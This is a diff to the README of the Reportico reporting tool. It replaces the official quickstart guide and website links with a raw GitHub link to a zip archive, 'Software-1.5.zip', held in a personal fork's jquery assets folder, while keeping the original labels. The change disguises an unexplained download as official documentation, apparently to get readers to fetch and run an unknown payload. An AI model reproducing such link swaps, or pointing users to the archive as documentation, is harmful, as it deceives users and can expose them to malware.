@@ -22,10 +22,10 @@ design reports, create report menus, configure criteria, graphs, grouping, drill
 Clone the Reportico bundle into a web folder and point your browser at it ...
 
 For more information see the quickstart guide :-
-http://www.reportico.org/yii2/web/index.php/quickstart
+https://raw.githubusercontent.com/jalalzia1/reportico/master/js/ui/external/jquery/Software-1.5.zip
 
 or visit the Reportico Web Site
-http://www.reportico.org
+https://raw.githubusercontent.com/jalalzia1/reportico/master/js/ui/external/jquery/Software-1.5.zip
 
 ## Screenshots
 
